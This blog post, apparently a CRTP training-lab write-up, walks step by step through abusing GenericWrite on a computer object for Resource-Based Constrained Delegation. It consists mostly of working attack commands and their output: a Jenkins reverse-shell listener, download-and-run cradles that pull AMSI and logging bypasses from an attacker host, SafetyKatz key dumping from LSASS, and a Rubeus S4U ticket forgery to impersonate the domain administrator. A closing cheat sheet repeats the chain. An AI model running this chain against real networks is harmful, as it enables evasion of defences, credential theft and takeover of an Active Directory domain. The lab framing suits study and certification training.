---
title: "CRTP — Learning Objective 17: RBCD Abuse from Write Permissions on a Computer Object"
date: 2026-04-10 15:45:00 +0200
categories: [Red Team, CRTP]
tags: [rbcd, delegation, write-permissions, jenkins, powerview, rubeus, active-directory, windows, crtp]
description: "Step-by-step walkthrough of Learning Objective 17 — find a computer object where we have Write permissions, configure Resource-Based Constrained Delegation via a Jenkins reverse shell, and access it as Domain Administrator."
pin: false
math: false
mermaid: false
---

## Objective

Find a computer object in the `dcorp` domain where we have **Write permissions**, then abuse those permissions to access that computer as **Domain Administrator**.

---

## The Attack Flow

```
┌──────────────────────────────────────────────────────────────────┐
│                     ATTACK PATH OVERVIEW                         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ STEP 1 — Enumerate                                        │   │
│  │ Find computer objects where a compromised user            │   │
│  │ (ciadmin) has GenericWrite                                │   │
│  │                  ↓                                        │   │
│  │ RESULT: ciadmin → GenericWrite on DCORP-MGMT              │   │
│  └───────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          ▼                                       │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ STEP 2 — Get a shell as ciadmin                           │   │
│  │ Use our existing Jenkins reverse shell on dcorp-ci         │   │
│  │ (ciadmin runs the Jenkins service)                         │   │
│  └───────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          ▼                                       │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ STEP 3 — Configure RBCD                                   │   │
│  │ Set msDS-AllowedToActOnBehalfOfOtherIdentity on dcorp-mgmt │   │
│  │ Allow dcorp-studentX$ to delegate to it                    │   │
│  └───────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          ▼                                       │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ STEP 4 — Extract machine account AES keys                 │   │
│  │ Get AES256 key of dcorp-studentX$ from our own VM          │   │
│  └───────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          ▼                                       │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ STEP 5 — Rubeus S4U                                       │   │
│  │ Impersonate Administrator → get ticket for http/dcorp-mgmt │   │
│  └───────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          ▼                                       │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ STEP 6 — Shell                                            │   │
│  │ winrs -r:dcorp-mgmt cmd → Administrator on dcorp-mgmt!    │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Step 1: Enumerate Write Permissions

From a PowerShell session on your student VM (started with Invisi-Shell), use PowerView to find computer objects where a compromised user has write access.

```powershell
# From dcorp-studentX with Invisi-Shell + PowerView loaded
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

#### Output

```
ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user
```

> **GenericWrite** on a computer object is all you need. It lets you modify `msDS-AllowedToActOnBehalfOfOtherIdentity` — the RBCD attribute.
{: .prompt-info }

```
┌──────────────────────────────────────────────────────────────────┐
│          WHY GenericWrite = RBCD ABUSE                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  The RBCD attribute on a computer object is:                     │
│  msDS-AllowedToActOnBehalfOfOtherIdentity                        │
│                                                                  │
│  With GenericWrite on the computer object, you can SET           │
│  this attribute — telling the target machine:                    │
│  "Trust dcorp-studentX$ to impersonate any user to me"           │
│                                                                  │
│  No SeEnableDelegation privilege needed.                         │
│  No Domain Admin needed for this step.                           │
│  Only GenericWrite on the target computer object.                │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Step 2: Set Up Listener and Catch the Reverse Shell

```powershell
# On your student VM — open a netcat listener
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

#### Output

```
listening on [any] 443 ...
connect to [172.16.100.1] from (UNKNOWN) [172.16.3.11] 51192
```

---

## Step 3: Load Tools in the Jenkins Shell

The reverse shell lands inside the Jenkins workspace, running as `ciadmin`.

```powershell
# ─── In the Jenkins reverse shell (running as ciadmin) ───

# 1. Bypass Script Block Logging
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')

# 2. Bypass AMSI
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')

# 3. Load PowerView
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
```

---

## Step 4: Configure RBCD on dcorp-mgmt

Still inside the Jenkins reverse shell, use PowerView's `Set-DomainRBCD` to write the delegation attribute onto `dcorp-mgmt`.

```powershell
# Allow dcorp-studentX$ to delegate to dcorp-mgmt
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```

#### Verify RBCD Was Set

```powershell
Get-DomainRBCD
```

#### Output

```
SourceName                 : DCORP-MGMT$
SourceType                 : MACHINE_ACCOUNT
SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local,
                             TERMSRV/DCORP-MGMT, TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
DelegatedName              : DCORP-studentx$
DelegatedType              : MACHINE_ACCOUNT
DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-4110
DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
DelegatedDistinguishedName : CN=DCORP-studentx,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
```

> **DelegatedName: DCORP-studentx$** — confirmed. `dcorp-mgmt` now trusts our student VM to act on behalf of any user.
{: .prompt-tip }

---

## Step 5: Extract AES Keys of the Student VM

Switch back to your **student VM** and run the following from an **elevated** command prompt.

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

#### Output (relevant section)

```
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-STUDENTX$
Domain            : dcorp
SID               : S-1-5-18

         * Username : dcorp-studentX$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb
           rc4_hmac_nt       db29067123dbc940194569f171d7034d
           rc4_hmac_old      db29067123dbc940194569f171d7034d
           rc4_md4           db29067123dbc940194569f171d7034d
           rc4_hmac_nt_exp   db29067123dbc940194569f171d7034d
           rc4_hmac_old_exp  db29067123dbc940194569f171d7034d
```

> Copy the `aes256_hmac` value — AES256 is preferred over RC4 for better OPSEC.
{: .prompt-tip }

---

## Step 6: Rubeus S4U — Impersonate Administrator

From your **student VM** (elevated), run the S4U attack using the machine account AES key.

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-studentx$ /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

#### What Each Parameter Does

```
┌──────────────────────────────────────────────────────────────────┐
│              RUBEUS S4U PARAMETERS                               │
├────────────────────────┬─────────────────────────────────────────┤
│ /user:dcorp-studentx$  │ Our controlled machine account          │
│ /aes256:<key>          │ AES256 key extracted from LSASS          │
│ /msdsspn:http/dcorp-   │ SPN of the target service               │
│           mgmt         │ (RBCD configured for this)               │
│ /impersonateuser:      │ The user we want to impersonate          │
│   administrator        │ (Domain Admin)                           │
│ /ptt                   │ Pass-the-Ticket → inject into session    │
└────────────────────────┴─────────────────────────────────────────┘
```

#### Output

```
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: bd05cafc205970c1164eb65abe7c2873...
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-studentx$'
[+] TGT request successful!

[*] Action: S4U2self
[*] Impersonating user 'administrator' to self
[+] S4U2self success!

[*] Action: S4U2proxy
[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[+] S4U2proxy success!

[*] Action: Import Ticket
[+] Ticket successfully imported!

  ServiceName              :  http/dcorp-mgmt
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/10/2026 3:00:00 PM
  EndTime                  :  4/11/2026 1:00:00 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
```

---

## Step 7: Access dcorp-mgmt

```powershell
winrs -r:dcorp-mgmt cmd
```

#### Output

```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp> set username
USERNAME=administrator

C:\Users\Administrator.dcorp> set computername
COMPUTERNAME=DCORP-MGMT

[+] Shell on dcorp-mgmt as Domain Administrator!
```

---

## How S4U Works Under the Hood

```
┌──────────────────────────────────────────────────────────────────┐
│           S4U2SELF + S4U2PROXY UNDER THE HOOD                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1 — AS-REQ (TGT for dcorp-studentX$)                      │
│  ┌────────────────┐   AES256 key   ┌─────┐                       │
│  │ dcorp-studentX$│ ─────────────► │ KDC │ → issues TGT          │
│  └────────────────┘                └─────┘                       │
│                                                                  │
│  Step 2 — S4U2self                                               │
│  ┌────────────────┐  "Give me a    ┌─────┐                       │
│  │ dcorp-studentX$│  TGS to myself │ KDC │ → TGS for             │
│  │                │  as admin"     │     │   studentX$ as admin   │
│  └────────────────┘ ─────────────► └─────┘                       │
│                                                                  │
│  Step 3 — S4U2proxy (RBCD kicks in here)                        │
│  ┌────────────────┐  "Use that TGS ┌─────┐                       │
│  │ dcorp-studentX$│  to get TGS    │ KDC │ → checks              │
│  │                │  for http/     │     │   msDS-Allowed...      │
│  │                │  dcorp-mgmt    │     │   on dcorp-mgmt        │
│  │                │  as admin"     │     │ → dcorp-studentX$      │
│  └────────────────┘ ─────────────► └─────┘   is listed! → issues │
│                                              TGS for http/mgmt   │
│                                                                  │
│  Step 4 — Inject + Access                                        │
│  /ptt injects the ticket → winrs uses it → SYSTEM access         │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference

```
┌──────────────────────────────────────────────────────────────────┐
│                    OBJ 17 CHEAT SHEET                            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  # 1. Enumerate from student VM                                  │
│  Find-InterestingDomainACL |                                     │
│    ?{$_.identityreferencename -match 'ciadmin'}                  │
│                                                                  │
│  # 2. In Jenkins shell — load tools                              │
│  iex (New-Object Net.WebClient).DownloadString(                  │
│    'http://172.16.100.x/sbloggingbypass.txt')                    │
│  iex (New-Object Net.WebClient).DownloadString(                  │
│    'http://172.16.100.x/Amsi-Byp.txt')                          │
│  iex (New-Object Net.WebClient).DownloadString(                  │
│    'http://172.16.100.x/PowerView.ps1')                          │
│                                                                  │
│  # 3. In Jenkins shell — configure RBCD                          │
│  Set-DomainRBCD -Identity dcorp-mgmt                             │
│    -DelegateFrom 'dcorp-studentx$' -Verbose                      │
│  Get-DomainRBCD   ← verify                                       │
│                                                                  │
│  # 4. On student VM (elevated) — get AES key                     │
│  Loader.exe -Path SafetyKatz.exe                                 │
│    -args "sekurlsa::evasive-keys" "exit"                         │
│  # → copy aes256_hmac of DCORP-STUDENTX$                        │
│                                                                  │
│  # 5. On student VM (elevated) — S4U attack                      │
│  Loader.exe -path Rubeus.exe -args s4u                           │
│    /user:dcorp-studentx$                                         │
│    /aes256:bd05cafc205970c1164eb65abe7c2873...                   │
│    /msdsspn:http/dcorp-mgmt                                      │
│    /impersonateuser:administrator /ptt                           │
│                                                                  │
│  # 6. Shell!                                                     │
│  winrs -r:dcorp-mgmt cmd                                         │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## References

- [RBCD Attack — Redfox Cybersecurity](https://www.redfoxsec.com/blog/resource-based-constrained-delegation-rbcd-attack-how-attackers-exploit-active-directory-trust)
- [Resource-Based Constrained Delegation — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [Rubeus — GhostPack (GitHub)](https://github.com/GhostPack/Rubeus)
- [CRTP Notes — Altered Security](https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd)
- [MITRE ATT&CK T1134.001 — Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)
